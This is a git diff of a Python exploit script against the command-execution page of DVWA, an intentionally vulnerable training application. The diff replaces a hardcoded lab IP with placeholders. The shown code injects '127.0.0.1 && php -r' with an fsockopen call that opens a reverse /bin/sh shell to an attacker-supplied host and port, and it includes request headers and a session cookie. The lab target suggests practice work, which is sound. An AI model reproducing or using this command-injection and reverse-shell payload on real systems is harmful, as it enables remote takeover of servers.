@@ -1,7 +1,7 @@
 import requests
 from bs4 import BeautifulSoup
 
-url = "http://192.168.12.162/vulnerabilities/exec/"  # URL Here
+url = "http://your_ip_here/vulnerabilities/exec/"  # URL Here
 
 # Include your headers
 headers = {
@@ -9,9 +9,9 @@ headers = {
     "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
     "Accept-Language": "en-US,en;q=0.5",
     "Accept-Encoding": "gzip, deflate, br",
-    "Referer": "http://192.168.12.162/vulnerabilities/exec/",
+    "Referer": "http://your_ip_here/vulnerabilities/exec/",
     "Content-Type": "application/x-www-form-urlencoded",
-    "Origin": "http://192.168.12.162",
+    "Origin": "http://your_ip_here",
     "DNT": "1",
     "Connection": "close",
     "Cookie": "security=low; PHPSESSID=ge2i5ou0n58jrdsgl2gkc1u6p0; security=low",
@@ -65,7 +65,7 @@ if u_input == "HI":
 
 
 if u_input == "SHELL":
-    payload = "127.0.0.1 && php -r '$sock=fsockopen(\"192.168.12.162\",4444);`/bin/sh <&3 >&3 2>&3`;'"
+    payload = "127.0.0.1 && php -r '$sock=fsockopen(\"your_ip_here\",your_port_here);`/bin/sh <&3 >&3 2>&3`;'"
 
     data = {"ip": payload, "Submit": "Submit"}
 
